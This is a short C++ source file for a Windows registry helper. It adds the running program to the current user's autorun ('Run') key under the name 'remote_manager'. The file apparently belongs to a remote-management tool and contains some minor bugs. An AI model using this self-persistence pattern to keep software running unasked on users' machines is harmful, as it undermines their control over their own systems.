#include "registryHandler.h"
#include <Windows.h>

#define ERROR_SIZE 100
#define AUTORUN_REGISTRY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define AUTORAN_NAME "remote_manager"

std::string registryHandler::getProccessPath(int size) {
    char* executablePath = (char*)malloc(sizeof(char) * size);
    DWORD pathSize = size;
    std::string strPath = "";
    QueryFullProcessImageNameA(GetCurrentProcess(), 0, executablePath, &pathSize);
    if (pathSize == size)
    {
        free(executablePath);
        throw std::exception("couldn't get process path");
    }
    strPath.assign(executablePath);
    free(executablePath);
    return strPath;
}

void registryHandler::addToRegistry(std::string executablePath, std::string autoranName) {
    char error[ERROR_SIZE] = {0};

    LSTATUS status = RegSetKeyValueA(HKEY_CURRENT_USER, AUTORUN_REGISTRY_PATH, autoranName.c_str(), REG_SZ,
                                     executablePath.c_str(), sizeof(char) * (executablePath.length() + 1));
    
    if (status != ERROR_SUCCESS) {
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, NULL, NULL, error, ERROR_SIZE, NULL);
        std::exception(error);
    }
}

void registryHandler::addProcessRegistry(int size) {
    std::string executablePath = registryHandler::getProccessPath(size);
    registryHandler::addToRegistry(executablePath);
}
